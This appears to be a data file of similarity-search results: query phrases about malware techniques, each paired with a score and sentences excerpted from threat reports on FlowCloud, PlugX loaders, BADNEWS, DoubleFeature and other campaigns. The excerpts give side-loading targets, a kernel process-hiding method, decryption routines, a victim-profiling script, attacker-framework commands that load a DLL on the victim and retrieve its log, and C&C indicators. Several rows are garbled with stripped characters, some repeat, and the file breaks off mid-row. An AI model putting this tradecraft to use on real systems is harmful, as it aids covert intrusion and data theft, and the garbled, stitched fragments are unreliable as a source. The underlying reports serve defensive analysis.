target for DLL side-loading|0.7940991483690395|['13Operation Dream Magic         .', '()     TLP: RED  .', '()   () TLP: AM BER .', ',              , ,  TLP: G REEN    ,    TLP: WHITE   ,   2  []      .', ',     .', '.', ',       .', '.', '2Operation Dream Magic  1.', '..................................................................................................................................................................................................... 4 2.', '.............................................................................................................................................................. 4 (1)  ........................................................................................................................................................................... 5 (2)  ......................................................................................................................................................................... 15 3.']
DLL side-loading|1.0000000000000002|['We also found some known malware families such as PlugX and HyperBro, as well as many custom post-exploitation tools.', 'Below we describe the loading, persistence, and features of the two backdoors.', 'Type 1 Backdoor Loading the Payload This backdoor is written in the C++ language with classes that inherit from virtual classes.', 'The backdoor is also modular, allowing for expansion with the use of plugins.', 'Current Method: DLL Side-Loading To load this backdoor, the threat actor launches the legitimate file MsMpEng.exe, which is signed by Microsoft and described as an Antimalware Service Executable.', 'This executable is vulnerable to DLL side-loading,3 wherein an unintended DLL is loaded on a program.', 'In this case, the malicious actor takes advantage of it by storing a file named mpsvc.dll in the same directory.', 'That DLL then opens a third filename, mpsvc.mui, which contains the obfuscated backdoor, decodes it, and loads it into a svchost.exe process.', 'We found two RAR archive files (detected as Trojan.Win64.CLAMBLING.A) in the wild containing the aforementioned files.', 'The modification time of the embedded files is 2019-07-25.', 'Old Method: Patching of a Legitimate File Interestingly, we observed a different technique being used in an older version of this backdoor.']
DLL side-loading|0.7710437972117202|['PlugX is a modular structured malware that has many different operational plugins such as communication compression and encryption, network enumeration, files interaction, remote shell operations and more.', 'The samples we analyzed originated from the Philippines.', 'APT10 frequently targets the Southeast Asia region.', 'In this article we examine both versions of the loader along with their payloads, TTPs and Command and Control (C&C) server information.', 'https://blog.ensilo.com/uncovering-new-activity-by-apt10 1/115/28/2019 Uncovering New Activity By APT10 Loader Abusing a Legitimate Executable The loader starts out by running a legitimate executable which is abused to load a malicious DLL instead of a legitimate one which it is depended on.', 'The method is known as DLL Side-Loading.', 'In both variants, the abused executable is jjs.exe which loads jli.dll.', 'The DLL exports the following functions: JLI_CmdToArgs JLI_GetStdArgs JLI_GetStdArgc JLI_MemAlloc JLI_Launch The first function called by jjs.exe is JLI_CmdToArgs which is implemented by the malware author and behaves differently in each variant.', 'Running The Payload The malicious DLL maps the data file, svchost.bin, to memory and decrypt it.', 'The decrypted content is a shellcode that is injected into svchost.exe and contains the actual malicious payload.', 'The decryption process resembles previous versions used by the group in PlugX\\\\RedLeaves.']
DLL side-loading|1.0000000000000002|"['No further content was served from lite.php during the investigation.', 'A likely scenario is that the attackers may have wanted to use a Silverlight exploit to execute the malware in the case of a user who does not open or get successfully exploited by the weaponised document.', 'This could have been intended as an exploitation of something like CVE-2016-0034 which is known to have been adopted by exploit kits back in February 2016 and which pre-dates MONSOON.', ""HTTP/1.1 200 OK Date: Fri, 27 May 2016 22:32:29 GMT Server: Apache X-Powered-By: PHP/5.5.12 Content-Length: 749 Keep-Alive: timeout=5, max=100 Connection: Keep-Alive Content-Type: text/html <script>function hasSilverlightPlugin() { var slplugin = false; var browser = navigator.appName; // Get the browser type if (browser == 'Microsoft Internet Explorer') { try { var slControl = new ActiveXObject('AgControl.AgControl'); if (slControl) { slplugin = true; } } catch (e) { } } else { // Netscape, FireFox, Google chrome etc try { if (navigator.plugins['Silverlight Plug-In']) { slplugin = true; } } catch (e) { } } return slplugin; } var javascriptVariable = hasSilverlightPlugin(); window.location.href = 'lite.php?name='+javascriptVariable; </script> Figure 19 Silverlight Profiling MONSOON ANALYSIS OF AN APT CAMPAIGN Revision: 1.07 | TLP-WHITE | 21/57Forcepoint Security Labs | Special Investigations BADNEWS MALWARE The BADNEWS malware is capable of arbitrary command execution, screenshots, self-updating, downloading and executing files, and directory listings."", 'The name was given due to its use of RSS feeds, forums, blogs and Dynamic DNS providers for its C&C infrastructure.', 'BADNEWS uses a DLL side-loading technique with a signed Java binary in order to evade security solutions.', 'It is a first stage malware that is likely to receive second stage malware components if the target is of interest, although we did not observe this behaviour.', 'DLL Side-Loading.', 'The BADNEWS DLL is typically side-loaded into a legitimate signed Java executable.', ""A specific weaponised document analysed10 drops a binary blob and an encoded VBScript file which then extracts a decoy document along with the following 3 files: MicroScMgmt.exe msvcr71.dll jli.dll MicroScMgmt.exe is a renamed version of the legitimate Java Runtime's 6.0.390.4 binary named java- rmi.exe and is signed by Sun Microsystems."", 'This application requires the legitimate msvcr71.dll and also requires a DLL named jli.dll.']"
DLL side-loading|1.0000000000000002|"[']ua"", ,    .', ', , 08.11.2022  .', 'RAR- ""shahed-136.rar"",  PPSX- ""shahed.ppsx"", ,  , VBScript-,   ,  ,   PowerShell-.', ',    RC4,   ,    ""Manager""  ("" |shahed.ppsx"").', 'PowerShell-  BitsTransfer (Background Intelligent Transfer Management)   ""WibuCm32.dll"", ""CodeMeter.exe"" ( ),    .', ',  DLL Side-Loading.', '""WibuCm32.dll""   DolphinCape,    Delphi     (\' , \' , , ,  ), EXE/DLL ,   ,    .', 'UAC-0140.', ': 247997c2b4431585f9355d3324410298 460244cbf353b15b52c69952dd3b2549de79c590c56807bc25d4896dd0016655 shahed- 136.rar 241e4285a84be65cf16778462f06b9a8 5137a888271b08f388d863433e5f0f1b129e15d4c812b95c831e93e27ec45bd6 1/3shahed.ppsx 3444e86aefa7bc2dbce34903f805400d 6ee62645cd97fb0b41fdf219b9a2a8211324ded110b5c7f09b3d9881abb2a594 SearchEmbdIndex.ps1 142893c48b76b7e9d0f7ce74e16aaf1f 2c1a2fe3fb418601f3adc9256e1ff2c509178483fdbb0e964f52fb6b30be1129 CodeMeter.exe 98c3d5347842743bfb4ade50b39226c1 772654b186ad9fbd0a80f03ceae7d327b45c8944452cc39048160b1f6d8f2672 WibuCm32.dll (2022-09-24 06:09:32) (DolphinCape) : morgunov.a@dsns.com.ua 195[.', ']123.237.147 202[.', ']157.187.190 Mozilla/3.0 (compatible; Indy Library) dsns.com[.']"
DLL side-loading|0.898567946224601|['13Operation Dream Magic         .', '()     TLP: RED  .', '()   () TLP: AM BER .', ',              , ,  TLP: G REEN    ,    TLP: WHITE   ,   2  []      .', ',     .', '.', ',       .', '.', '2Operation Dream Magic  1.', '..................................................................................................................................................................................................... 4 2.', '.............................................................................................................................................................. 4 (1)  ........................................................................................................................................................................... 5 (2)  ......................................................................................................................................................................... 15 3.']
DLL side-loading|0.7550288776907068|[]
DLL side-loading|0.7931591747881945|['DLL- 2.', '.dat (SbieDll.dll / SbieMsg.dll) 3.', '.dat DLL 4.', 'MemLoadLibrary 5.', '9002 RATDeed RATMITREIOCs  2019   Positive Technologies (PT Expert Security Center, PT ESC)  ,   - .', '.', '2020      .', ',  ,      .', '2021 PT Expert Security Center  .', '.', '.']
the malicious library is the same and serves to load and execute shellcode from a file that is stored under the same name as the DLL|0.8544201182614279|['In the samples we observed, the task or service was configured to execute the next step of the installation process by running a legitimate application vulnerable to DLL search-order hijacking.', 'The application and the accompanying relevant and malicious DLL were both embedded in the loaders resources.', 'DLL side-loading (XXXModule_dlcore0) In the samples we analyzed, the vulnerable application was either setlang.exe from Microsoft Office 2003 with a malicious setlangloc.dll or vpreview.exe from Visio Preview 2007 with a malicious vviewres.dll.', 'Strings contained in the malicious DLL also point to emedres.dll from Emurasofts EmEditor as a possible third target for DLL side-loading.', 'This is a real possibility as such vulnerabilities were present in older versions of EmEditor, but we did not see any samples using it.', 'In all observed samples, the malicious library is the same and serves to load and execute shellcode from a file that is stored under the same name as the DLL, but with a .dat extension.', 'We analyze this shellcode in the next section, but first, we want to look at the notable anti-analysis techniques used in this library.', 'Despite its relatively simple goals, the librarys code makes heavy use of anti-debugging tricks and control flow obfuscation to hinder analysis.', 'In the function that loads the next file, the useful code is repeatedly interspersed with the same sequence of opcodes to obfuscate the programs flow.', 'As shown in Figure 9, this short snippet is packed full of anti-analysis tricks, but ultimately amounts to an unconditional 16-byte jump.', 'This is enough to foil many automatic analyses, including decompilers.']
the new process loads the decoy DLL and manually replaces its content in memory with the fcClientDll module (a process known as module stomping or DLL hollowing),|0.9173496726482018|['This process is created via CreateProcessAsUserW using a token retrieved from the explorer.exe or winlogon.exe process in the current session.', 'The injected code loads the same backdoor (rescure.dat) into the processs memory and calls its startModule export to finish the installation.', 'Meanwhile, the injection process is terminated.', '11/26At this point, installation of the backdoor is complete.', 'All that is left is to execute the backdoor.', 'To achieve this, the new process loads the decoy DLL and manually replaces its content in memory with the fcClientDll module (a process known as module stomping or DLL hollowing), before calling its main function.', 'fcClientDll (responsor.dat) This complex module is the main component of the backdoor.', 'It provides a wide range of capabilities from full file system access to control of camera peripherals and everything in between.', 'Although we did not observe any plug-ins, the backdoor contains code that hints that they can be used to further extend functionality.', 'Before diving deeper into the functionalities, we want to highlight some notable characteristics: Configuration information and data for communications with the C&C server are Protobuf-serialized, compressed, and encrypted.', 'File exfiltration is done through encrypted, Protobuf-serialized structures and is disguised as HTTP by prepending the data with a hardcoded, fake POST request.']
If a task with the same name already exists, it is deleted before the new one is created|1.0000000000000002|['Decompiler view showing the obvious pattern of anti-debugging checks.', 'Note that we had to remove the aforementioned obfuscation for the decompiler to produce any output.', 'fcClient (rescure.dat) When it is first executed, this module sets up persistence and installs the backdoor, rootkit, and persistence modules.', 'It then sets specific registry keys and files as guardrails to skip the setup on subsequent runs.', 'First, persistence is established by using the ITaskService COM interface to create the \\\\Microsoft\\\\Windows\\\\CertificateServicesClient\\\\NetTask scheduled task.', 'If a task with the same name already exists, it is deleted before the new one is created.', 'This task will run the DLL hijacking target as SYSTEM at each boot.', 'Afterwards, the rootkit module is decrypted and written to the %System%\\\\drivers folder as hidmouse.sys.', 'A hidmouse service is then created to run that module and is immediately started.', 'The file is then deleted from the disk and replaced by a copy of the legitimate hidusb.sys driver from the same folder.', 'Thus, anyone looking at the file on disk rather than the one mapped into memory would see a legitimate, benign file.']
If a task with the same name already exists, it is deleted before the new one is created|1.0000000000000002|['If those checks detect a debugger, the function returns a value that will cause the program to jump to an invalid address and crash.', 'The second one raises an exception via theINT 0x2Dinstruction and exits if it was handled by a debugger.Figure 10.', 'Decompiler view showing the obvious pattern of anti-debugging checks.', 'Note that we had to remove the aforementioned obfuscation for the decompiler to produce any output.fcClient (rescure.dat)When it is first executed, this module sets up persistence and installs the backdoor, rootkit, and persistence modules.', 'It then sets specific registry keys and files as guardrails to skip the setup on subsequent runs.First, persistence is established by using theITaskServiceCOM interface to create the\\\\Microsoft\\\\Windows\\\\CertificateServicesClient\\\\NetTaskscheduled task.', 'If a task with the same name already exists, it is deleted before the new one is created.', 'This task will run the DLL hijacking target asSYSTEMat each boot.Afterwards, the rootkit module is decrypted and written to the%System%\\\\driversfolder ashidmouse.sys.', 'Ahidmouseservice is then created to run that module and is immediately started.', 'The file is then deleted from the disk and replaced by a copy of the legitimatehidusb.sysdriver from the same folder.', 'Thus, anyone looking at the file on disk rather than the one mapped into memory would see a legitimate, benign file.On Windows 10 machines, the system time is briefly changed to make it look like the service was created in January 2013.', 'Both this and the use of the legitimate driver directory help the rootkit blend in with other drivers.The following files are copied to the%System%directory:The backdoor:rescure.datA decoy DLL:sspisrvui.datassspisrvui.dll(timestompedto July 2013)The encrypted shellcode:rebare.datTherebare.datshellcode is very similar to that used in the self-decrypting DLL, but it loadsfcClientdirectly.FlowCloud then starts a suspended process to perform injection on it.']
After hijacking the aforementioned drivers, the rootkit erases the DLL names associated with them from internal structures used to display device drivers.|0.9765800759399365|['This module is signed with a certificate with the thumbprint 02ED6A578C575C8D9C72398E790354B095BB07BC.', 'Issued to Hangzhou Leishite Laser Technology Co. in 2012 by Wosign and revoked in 2014, it seems most likely this certificate was stolen.', 'Keylogging In its IRP_MJ_READ handlers for keyboard and mouse events, the driver simply records IO events to lookaside lists before passing them to the legitimate handler.', 'This ensures that the driver doesnt interfere in a way that could be noticeable by the user.', 'These events are then parsed to the format used by the backdoors keymouse_manager and written to the named pipe \\\\\\\\.\\\\pipe\\\\namedpipe_keymousespy_english.', 'Rootkit After hijacking the aforementioned drivers, the rootkit erases the DLL names associated with them from internal structures used to display device drivers.', 'The rootkit can prevent processes from being shown by utilities that list running processes, such as Task Manager.', 'As shown in Figure 17, it achieves this by removing their entries from the ActiveProcessLinks list of the undocumented KPROCESS kernel structure.', 'Since this structure is not part of the public API and can change between releases, the rootkit contains code to match the operating systems build number to the correct offsets in this structure.', 'That code covers all versions from Windows XP to Windows 10 20H1.', 'This functionality can be invoked on any process via the IOCTL_HIDE_PROCESS_BY_PROCESSID (0x222028) control code.']
Covers its tracks by overwriting the code previously modified by the malicious library with a useless call to lstrlenW.|0.8426861194719155|['It first decrypts the embedded DLL using a byte-oriented XOR-and- ADD scheme (shown in Figure 16).', 'The shellcode we analyzed used the key 0x7B.', 'Once it has decrypted the embedded DLL, the shellcode manually performs the functions of LoadLibrary and calls the loaded modules startModule export.', '1for (int i=0; i < ciphertext_length; i++) 2 plaintext[i] = ((encrypted[i] ^ key) + key) & 0xFF Figure 16.', 'Pseudocode for the DLL decryption routine This newly loaded module uses the same anti-debugging and anti-analysis techniques as the hijacking DLL described above.', 'On top of those, it also uses a few tricks of its own: Covers its tracks by overwriting the code previously modified by the malicious library with a useless call to lstrlenW.', 'Base64-encoded strings are used for function imports (via GetProcAddress) and only decoded as needed.', 'Exits if the processs executable is not the expected DLL hijacking target (e.g., setlang.exe).', 'The module creates a new process using the same executable and performs process injection on it, redirecting the existing thread to the written code region.', 'This code inside the new process launches a thread that decrypts and loads the fcClient module before calling its startModule export.', 'That function will perform the final stages of the installation and load the DLL containing the backdoor functionality.']
removing their entries from the ActiveProcessLinks list of the undocumented KPROCESS kernel structure.|0.8727139310272298|['Keylogging In its IRP_MJ_READ handlers for keyboard and mouse events, the driver simply records IO events to lookaside lists before passing them to the legitimate handler.', 'This ensures that the driver doesnt interfere in a way that could be noticeable by the user.', 'These events are then parsed to the format used by the backdoors keymouse_manager and written to the named pipe \\\\\\\\.\\\\pipe\\\\namedpipe_keymousespy_english.', 'Rootkit After hijacking the aforementioned drivers, the rootkit erases the DLL names associated with them from internal structures used to display device drivers.', 'The rootkit can prevent processes from being shown by utilities that list running processes, such as Task Manager.', 'As shown in Figure 17, it achieves this by removing their entries from the ActiveProcessLinks list of the undocumented KPROCESS kernel structure.', 'Since this structure is not part of the public API and can change between releases, the rootkit contains code to match the operating systems build number to the correct offsets in this structure.', 'That code covers all versions from Windows XP to Windows 10 20H1.', 'This functionality can be invoked on any process via the IOCTL_HIDE_PROCESS_BY_PROCESSID (0x222028) control code.', 'It is also used, on driver startup, to hide the process with the PID contained in the registry key HKLM\\\\HARDWARE\\\\{76BA14B7-AF0C-4dc9-9E9D-2A6970F231D9}.', 'This process is further camouflaged by changing its associated executable filename to one of svchost.exe or dllhost.exe in the same kernel structure.']
then starts a suspended process to perform injection on it.|0.8692603344956126|['The file is then deleted from the disk and replaced by a copy of the legitimate hidusb.sys driver from the same folder.', 'Thus, anyone looking at the file on disk rather than the one mapped into memory would see a legitimate, benign file.', 'On Windows 10 machines, the system time is briefly changed to make it look like the service was created in January 2013.', 'Both this and the use of the legitimate driver directory help the rootkit blend in with other drivers.', 'The following files are copied to the %System% directory: The backdoor: rescure.dat A decoy DLL: sspisrvui.dat as sspisrvui.dll (timestomped to July 2013) The encrypted shellcode: rebare.dat The rebare.dat shellcode is very similar to that used in the self-decrypting DLL, but it loads fcClient directly.', 'FlowCloud then starts a suspended process to perform injection on it.', 'This process is created via CreateProcessAsUserW using a token retrieved from the explorer.exe or winlogon.exe process in the current session.', 'The injected code loads the same backdoor (rescure.dat) into the processs memory and calls its startModule export to finish the installation.', 'Meanwhile, the injection process is terminated.', '11/26At this point, installation of the backdoor is complete.', 'All that is left is to execute the backdoor.']
Each manager stores collected data in its own SQLite database, while data that is collected on demand is returned directly to the C&C server|1.0|"['id: This value uniquely identifies the victim.', 'Initially, it is empty; the value is generated on the first execution using the following format: <prefix>_<current timestamp>_<machine hostname> 1 server_config 2 { 3 4 product_name: PCArrowI"" 12/265 product_version: ""v5.0.2"" 6 id: ""1202_[REDACTED]"" 7 root: """" 8 file_server: ""47.111.22[.', ']65"" 9 file_server_port: ""80"" 10 file_server_bak: """" 11 file_server_bak_port: """" 12 exchange_server: ""47.111.22[.', ']65"" 13 exchange_server_port: ""81"" 14 exchange_server_bak: """" 15 exchange_server_bak_port: """" 16 file_server_key: ""E\\\\367\\\\016\\\\031<>"" 17 xchg_server_key: ""8\\\\335\\\\325$<>"" 18 file_key: ""U\\\\267\\\\323\\\\353\\\\<>"" 19 is_audio_only: false 20 id_prefix: ""1202"" 21} 22 Figure 12. server_config section of a decoded FlowCloud configuration FlowClouds capabilities are spread out over a series of singleton classes, each of which implements a cohesive set of functionalities related to a specific type of data or action.', 'These roughly follow an internal naming convention where classes with names ending with manager_handler perform actions in response to C&C commands, while those whose names end with manager automatically perform actions based on timers or event listeners.', 'Each manager stores collected data in its own SQLite database, while data that is collected on demand is returned directly to the C&C server.', 'Data is encrypted with the aforementioned file_key before being inserted into the database.', 'The location of the SQLite databases is defined by the data_folder install configuration key, with the default value being %ProgramFiles%\\\\MSBuild\\\\Microsoft\\\\Expression\\\\Blend\\\\msole\\\\fcdata.', 'The classes are orchestrated by an instance of fc_kernel_manager.', 'This object is responsible for initializing other components and handling C&C connections.', 'It can also update the local configuration when the corresponding command is received.']"
Monitoring file system events to collect new and modified files.|1.0|['ESET telemetry shows victims all around the world, mainly in the governmental and education sectors.', 'TA410 had access to the most recent known Microsoft Exchange remote code execution vulnerabilities, e.g., ProxyLogon in March 2021 and ProxyShell in August 2021.', 'ESET researchers found a new version of FlowCloud, a complex and modular C++ RAT.', 'It has several interesting capabilities, including: Controlling connected microphones and triggering recording when sound levels above a specified threshold volume are detected.', 'Monitoring clipboard events to steal clipboard content.', 'Monitoring file system events to collect new and modified files.', 'Controlling attached camera devices to take pictures of the compromised computers surroundings.', 'FlowCloud deploys a rootkit to hide its activity on the compromised machine.', 'The LookBack backdoor utilized by TA410 uses a custom network protocol, which can function over HTTP or raw TCP, for C&C server communications.', 'TA410 is one of the users of the Royal Road malicious document builder.', 'TA410 teams compromise their targets in various ways, which indicates to us that those victims are targeted specifically, with the attackers choosing which entry method has the best chance of infiltrating the target.']
can search through connected file systems and obtain directory listings.|0.7907714519813922|['Process with Token Indicator Removal on T1070.004 FlowCloud deletes its rootkits executable after launching it.', 'Host: File Deletion Indicator Removal on T1070.006 FlowCloud backdates some files and services to 2013.', 'Host: Timestomp Application Window When logging mouse events, FlowCloud gathers information T1010 Discovery about the application running in the foreground.', 'T1057 Process Discovery Multiple TA410 backdoors can list running processes.', 'FlowCloud uses the IShellAppManager COM object to list T1518 Software Discovery installed software.', 'File and Directory FlowCloud can search through connected file systems and T1083 Discovery obtain directory listings.', 'Peripheral Device Discovery T1120 FlowCloud can list connected camera devices.', 'Discovery System Network T1016 Configuration FlowCloud can discover and use locally configured proxies.', 'Discovery FlowCloud components use registry keys to signal each T1012 Query Registry other.', 'FlowCloud registers a listener to steal clipboard data when it T1115 Clipboard Data is changed.', 'Collection T1056 Input Capture FlowCloud logs mouse clicks.']
collects file and directory metadata|0.821640474993645|['File system FlowCloud provides interaction with the file system in a variety of ways, most of which can store file metadata and content in their SQLite database.', 'One of these is a component that walks through all mapped file systems and collects files that are not excluded by filters in the smfile_search_policy.', 'It also creates an invisible window that listens for file creation, modification, or renaming events.', 'The corresponding files are collected unless they are excluded by that policy.', 'Another component collects information about mapped volumes, including mount point, name, drive type, and disk usage data.', 'This same class collects file and directory metadata.', 'As a complement to these automated measures, the backdoor implements functions that provide full access and control over the content of mounted drives.', 'This includes bidirectional file transfers between the C&C and the compromised machine.', 'Programs and processes FlowCloud is able to automatically obtain a list of installed software through the use of the undocumented IShellAppManager COM interface.', 'This functionality can also be invoked via a C&C command.', 'Figure 14 shows, after the extraneous code has been removed, how that interface is used.']
performs the functions of LoadLibrary and calls the loaded module’s startModule export.|0.7617511291421655|['Much like a voice assistant, FlowCloud can use a computers microphone to listen to its surroundings, but instead of recording being triggered by a command word, it seems to be triggered by any sound over a threshold defined by the decibel_limit 16/26field of the audio_policy.', 'The default value is 65 decibels, which is in the upper range of normal conversation volume (commonly defined to be anywhere between 50 and 70 dB by various sources).', 'Self-decrypting DLL (setlangloc.dat) The loaded shellcode is a self-decrypting DLL.', 'It first decrypts the embedded DLL using a byte-oriented XOR-and- ADD scheme (shown in Figure 16).', 'The shellcode we analyzed used the key 0x7B.', 'Once it has decrypted the embedded DLL, the shellcode manually performs the functions of LoadLibrary and calls the loaded modules startModule export.', '1for (int i=0; i < ciphertext_length; i++) 2 plaintext[i] = ((encrypted[i] ^ key) + key) & 0xFF Figure 16.', 'Pseudocode for the DLL decryption routine This newly loaded module uses the same anti-debugging and anti-analysis techniques as the hijacking DLL described above.', 'On top of those, it also uses a few tricks of its own: Covers its tracks by overwriting the code previously modified by the malicious library with a useless call to lstrlenW.', 'Base64-encoded strings are used for function imports (via GetProcAddress) and only decoded as needed.', 'Exits if the processs executable is not the expected DLL hijacking target (e.g., setlang.exe).']
runs WMI queries every second to get all process creation and termination events.|0.8759202678065803|['This functionality can also be invoked via a C&C command.', 'Figure 14 shows, after the extraneous code has been removed, how that interface is used.', '15/26Figure 14.', 'Simplified code showing how the IShellAppManager COM interface is used to list installed applications Other commands can be used to retrieve a detailed list of available services and currently running processes.', 'Another interesting feature is the near real-time monitoring of process activity.', 'To achieve this, FlowCloud runs WMI queries every second to get all process creation and termination events.', 'The obtained information is correlated with data from the Win32_Process table for a more detailed view.', 'User activity FlowCloud is able collect a miscellany of data that we have decided to group under the User activity umbrella.', 'It has the ability to monitor the clipboard for changes and save any data it contains.', 'As seen in Figure 15, it achieves this by creating an invisible window with a custom class and registering two clipboard formats.', 'This window uses AddClipboardFormatListener (on Windows Vista or more recent) or SetClipboardViewer (on Windows XP and prior) to listen for clipboard content changes.']
runs WMI queries every second to get all process creation and termination events.|0.8759202678065803|['This same class collects file and directory metadata.As a complement to these automated measures, the backdoor implements functions that provide full access and control over the content of mounted drives.', 'This includes bidirectional file transfers between the C&C and the compromised machine.Programs and processesFlowCloud is able to automatically obtain a list of installed software through the use of the undocumentedIShellAppManagerCOM interface.', 'This functionality can also be invoked via a C&C command.', 'Figure 14 shows, after the extraneous code has been removed, how that interface is used.Figure 14.', 'Simplified code showing how theIShellAppManagerCOM interface is used to list installed applicationsOther commands can be used to retrieve a detailed list of available services and currently running processes.Another interesting feature is the near real-time monitoring of process activity.', 'To achieve this, FlowCloud runs WMI queries every second to get all process creation and termination events.', 'The obtained information is correlated with data from theWin32_Processtable for a more detailed view.User activityFlowCloud is able collect a miscellany of data that we have decided to group under the User activity umbrella.It has the ability to monitor the clipboard for changes and save any data it contains.', 'As seen in Figure 15, it achieves this by creating an invisible window with a custom class and registering two clipboard formats.', 'This window usesAddClipboardFormatListener(on Windows Vista or more recent) orSetClipboardViewer(on Windows XP and prior) to listen for clipboard content changes.Figure 15.', 'Set up monitoring of the clipboardCollected clipboard content is stored along with information about the current foreground window.', 'This information can help attackers understand the data by contextualizing it.FlowCloud can periodically take screenshots and store them with information about the foreground process and time since the last user input.']
It is encrypted using the AES algorithm|0.7735512001749869|['18/26The loader injects an orchestrator into memory in a svchost.exe process.', 'In turn, the orchestrator injects the network component into memory and communicates with it via a file located at C:\\\\ProgramData\\\\Microsoft\\\\Crypto\\\\RSA\\\\MachineKeys\\\\Log\\\\rsa.txt.', 'Figure 18 shows a summary of the X4 components.', 'Figure 18.', 'Summary of the X4 components The network component is shellcode.', 'It is encrypted using the AES algorithm and stored in the Windows registry.', 'Table 2 shows the three registry keys used by X4.', 'Table 2.', 'Network shellcode registry keys Registry Key Description HKLM\\\\SOFTWARE\\\\Microsoft\\\\DRM\\\\X4Key AES key.', 'Name of the process into which the shellcode will be injected HKLM\\\\SOFTWARE\\\\Microsoft\\\\DRM\\\\PSKey (spoolsv.exe).', 'HKLM\\\\SOFTWARE\\\\Microsoft\\\\DRM\\\\X4DataEncrypted shellcode.']
It is encrypted using the AES algorithm|0.8105143770519125|"['Its a tale as old as time.Figure 4:DoubleFeature main menuDoubleFeaturesPyScriptsdirectory contains its Python UI interface (doublefeature.py) but when the attacker chooses an option from the UI menu, behind the scenes instead of simply issuing an RPC, the script transmogrifies a template DLL,DoubleFeatureDll.dll.unfinalized, that resides in the pluginsuploadsdirectory.', 'The Python invokes the external toolAddResource.exe, found in the pluginstoolsdirectory, to implant a resource into the already-compiled DLL and make it ready to detonate, under a new name:DoubleFeatureDll.dll.configured.', 'The exact command run is:*localrun-redirect command""<g_dfconfiguretool>cmpf61104<configureddllpath><g_dfrscfile>""*""The flags used by the command are explained below.c(compressed) Zlib compress the datam(munge) = Obfuscate the resource by XORing with pseudo-random bytes.', 'The bytes are generated by running a PRNG (a32-bit LCG, if you insist) and using the execution timestamp as the seed; to allow recovery, the seed is prepended to the obfuscated resource.p(place) = Place the resource into a homebrew resource directory (more detail about this later).f(finalize) = Finalize the proprietary resource directory.6= Type of resource (in this case, the enum value 6 translates toRT_STRING, a string-table entry)1104= Name of the resource.After the main plugin DLL **is endowed with this new resource, the Python UI uses the DanderSpritzdllloadshell command to load it on the victim machine:dllload -ordinal 1 -library <configuredDllPath>Once the DLL on the victim side finishes running and writing the report to the log file on the victim machine, the Python UI exfiltrates the log file back to the attacker machine using the following DanderSpritz shell command:foregroundget<log_file_name>-nameDFReportWhile (as mentioned above) most output of DanderSpritz commands is viewed according to XSL specifications, the output of DoubleFeature is too large and varied for this approach to be feasible.', 'Instead, the attacker typically views the log file using a specialized program written for this purpose DoubleFeatureReader.exe, which can be available in the pluginstoolsdirectory.DoubleFeature writes all its log data to a debug log file named~yh56816.tmp; this artifact was covered inKasperskys 2015 reporton the remote access tool dubbed EquationDrug (more on that below).', 'This log file is encrypted using the AES algorithm.', 'Unless the user changes the key manually, the default one used isbadc0deb33ff00d(possibly to spite vegan developers).Main DLL of DoubleFeatureWhen the patched DLL (DoubleFeatureDll.dll.configured) is first loaded on the victim machine, it looks for a resource named 106 in a homebrew resource directory.', 'This directory resides in the .text section right after the actual code, and the DLL is able to find it by searching for a distinct magic value.', 'The homebrew resource directory has the following structure:**Resource_Directory_struct**: \tword word_0 \tword num_of_resources \tResource_data[] resource_array  dword resource_directory_size  dword magic_hash  **Resource_data**: \tword resource_type \tword resource_num \tdword offset_from_directory_start \tdword resource_sizeThis resource (which is distinct from the resource earlier grafted onto the DLL by invokingAddResource.exe) is encrypted at rest, and in order to be used, it must be decrypted and decompressed.', ""The (equivalent Python of the) logic is below.def decrypt_decompress_resource(buf, seed): \toutput = bytearray(b'') \tfor i in range(len(buf)): \t\tseed = (0xDD483B8F - (0x6033A96D * seed) % (2**32)) % (2**32) \t\tcur_xor_key = seed >> 8 \t\toutput.append((cur_xor_key & 0xff) ^ (buf[i] & 0xff))  uncompressed_resource = zlib.decompress(output[4:]) \treturn uncompressed_resourceResource 106, once decompressed, is a driver calledhidsvc.sys.It is loaded into the kernel by invoking the EpMe exploit of CVE-2017-0005 (this is the very same exploit that had its logic find its way into the Jian exploit somehow)."", 'After the driver is loaded, the DLL begins communicating with it usingDeviceIoControls.']"
It is encrypted using the AES algorithm|0.7735512001749869|['It is loaded by a VMProtect-ed loader, usually namedPortableDeviceApi.dllorWptsExtensions.dll.', 'Unfortunately, we were not able to uncover any persistence method.The loader injects an orchestrator into memory in asvchost.exeprocess.', 'In turn, the orchestrator injects the network component into memory and communicates with it via a file located atC:\\\\ProgramData\\\\Microsoft\\\\Crypto\\\\RSA\\\\MachineKeys\\\\Log\\\\rsa.txt.', 'Figure 18 shows a summary of the X4 components.Figure 18.', 'Summary of the X4 componentsThe network component is shellcode.', 'It is encrypted using the AES algorithm and stored in the Windows registry.', 'Table 2 shows the three registry keys used by X4.Table 2.', 'Network shellcode registry keysRegistry KeyDescriptionHKLM\\\\SOFTWARE\\\\Microsoft\\\\DRM\\\\X4KeyAES key.HKLM\\\\SOFTWARE\\\\Microsoft\\\\DRM\\\\PSKeyName of the process into which the shellcode will be injected (spoolsv.exe).HKLM\\\\SOFTWARE\\\\Microsoft\\\\DRM\\\\X4DataEncrypted shellcode.The decrypted shellcode looks like it was based on Metasploit and communicates with a hardcoded IP address via HTTP.', 'An interesting characteristic is that it uses the fakeHostheaderonedrive.live.com.Every second, the orchestrator, which lives in memory only, reads the cleartextrsa.txtfile to check whether there are new commands to execute.', 'The commands are received from the C&C server, via the network shellcode.', 'In the orchestrator, the commands are identified by a numerical identifier that is computed from the command name, as shown in Figure 19.Figure 19.']
The application and the accompanying relevant and malicious DLL were both embedded in the loader’s resources.|0.8879749346525105|['However, there is a custom AntivirusCheck class, which can check running processes against a hardcoded list of XOR-encrypted executable filenames from known security products: 360 Total Security, Avast, Avira, AVG, Bitdefender, ESET, Jiangmin Technology Antivirus, Kingsoft, McAfee, Micropoint, Norton, Rising Antivirus, and Trend Micro.', 'This class is only used if the loader is set to directly start the fcClient module via the auto_start_after_install configuration key.', 'Depending on the configuration keys used, the loader can either load the fcClientDll RAT module directly, thus bypassing most of the complex deployment process, or it can create a service or scheduled task.', 'In the former case, the task or service attains persistence by being set to start automatically on boot.', 'In the samples we observed, the task or service was configured to execute the next step of the installation process by running a legitimate application vulnerable to DLL search-order hijacking.', 'The application and the accompanying relevant and malicious DLL were both embedded in the loaders resources.', 'DLL side-loading (XXXModule_dlcore0) In the samples we analyzed, the vulnerable application was either setlang.exe from Microsoft Office 2003 with a malicious setlangloc.dll or vpreview.exe from Visio Preview 2007 with a malicious vviewres.dll.', 'Strings contained in the malicious DLL also point to emedres.dll from Emurasofts EmEditor as a possible third target for DLL side-loading.', 'This is a real possibility as such vulnerabilities were present in older versions of EmEditor, but we did not see any samples using it.', 